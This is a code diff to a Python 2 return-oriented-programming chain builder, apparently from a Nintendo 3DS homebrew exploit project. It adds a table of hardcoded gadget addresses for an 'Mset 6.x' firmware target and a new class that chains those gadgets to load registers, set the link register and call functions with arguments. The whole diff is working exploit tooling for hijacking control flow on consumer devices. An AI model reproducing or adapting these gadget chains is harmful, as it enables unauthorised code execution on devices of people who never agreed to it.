@@ -30,6 +30,20 @@ class Mset_4x_Gadget:
 	_ldr_r0_r0_pop_r4_pc = 0x0012FBBC
 	_str_r1_r0_pop_r4_pc = 0x0010CCBC
 
+class Mset_6x_Gadget:
+	# Register loads.
+	_pop_pc = 0x001002F9
+	_pop_r0_pc = 0x00144CF8
+	_pop_r1_pc = 0x001CD804
+	_pop_r3_pc = 0x00105110
+	_pop_r4_pc = 0x001001ED
+	_pop_r4_to_r12_pc = 0x0018B184
+	_pop_r4_lr_bx_r2 = 0x00192758
+	_pop_r1_to_r3_pc = 0x0011BE4D
+	# Loads and stores.
+	_ldr_r0_r0_pop_r4_pc = 0x00130818
+	_str_r1_r0_pop_r4_pc = 0x0010CF5C
+
 class Spider_4x_Gadget:
 	# Register loads.
 	_pop_pc = 0x0010DB6C
@@ -178,11 +192,11 @@ class ROP_WR2(ROP):
 		self._append(self.gadget._pop_r2_pc)
 		self._append(r2)
 	
-	def pop_lr(self, addy):
+	def pop_lr(self, lr):
 		self.pop_r2(self.gadget._pop_pc)
 		self._append(self.gadget._pop_r4_lr_bx_r2)
 		self._append(0x44444444)
-		self._append(addy)
+		self._append(lr)
 
 	def call(self, fun, args, cleancnt):
 		pops = [self.gadget._pop_r0_pc, self.gadget._pop_r1_pc, self.gadget._pop_r2_pc, self.gadget._pop_r3_pc]
@@ -243,9 +257,59 @@ class ROP_WOR2(ROP):
 			self._append(0xDEADBEEF)
 		self._append(fun)
 
+class ROP_WOR2_M6(ROP):
+	def pop_r2(self, r2):
+		self._append(self.gadget._pop_r1_to_r3_pc)
+		self._append(0x11111111)
+		self._append(r2)
+		self._append(0x33333333)
+
+	def pop_lr(self, lr):
+		self.pop_r2(self.gadget._pop_pc)
+		self._append(self.gadget._pop_r4_lr_bx_r2)
+		self._append(0x44444444)
+		self._append(lr)
+
+	def call(self, fun, args, cleancnt):
+		if len(args) > 4:
+			print "Nahhhh, not now, maybe later ({0})".format(args)
+			return
+		if len(args) >= 1:
+			self._append(self.gadget._pop_r0_pc)
+			self._append(args[0])
+		if len(args) > 1:
+			self._append(self.gadget._pop_r1_to_r3_pc)
+			for i in xrange(1, len(args)):
+				self._append(args[i])
+			for i in xrange(len(args) - 1, 3):
+				self._append(0xDEADBEEF)
+		self._append(fun)
+		for i in xrange(cleancnt):
+			self._append(0xDEADBEEF)
+
+	def call_lr(self, fun, args):
+		if len(args) > 4:
+			print "Nahhhh, not now, maybe later ({0})".format(args)
+			return
+		self.pop_lr(self.gadget._pop_pc)
+		if len(args) >= 1:
+			self._append(self.gadget._pop_r0_pc)
+			self._append(args[0])
+		if len(args) > 1:
+			self._append(self.gadget._pop_r1_to_r3_pc)
+			for i in xrange(1, len(args)):
+				self._append(args[i])
+			for i in xrange(len(args) - 1, 3):
+				self._append(0xDEADBEEF)
+		self._append(fun)
+
 class Mset_4x_ROP(ROP_WR2):
 	def __init__(self, _base):
 		ROP_WR2.__init__(self, _base, Mset_4x_Gadget());
+
+class Mset_6x_ROP(ROP_WOR2_M6):
+	def __init__(self, _base):
+		ROP_WOR2_M6.__init__(self, _base, Mset_6x_Gadget());
 
 class Spider_4x_ROP(ROP_WR2):
 	def __init__(self, _base):
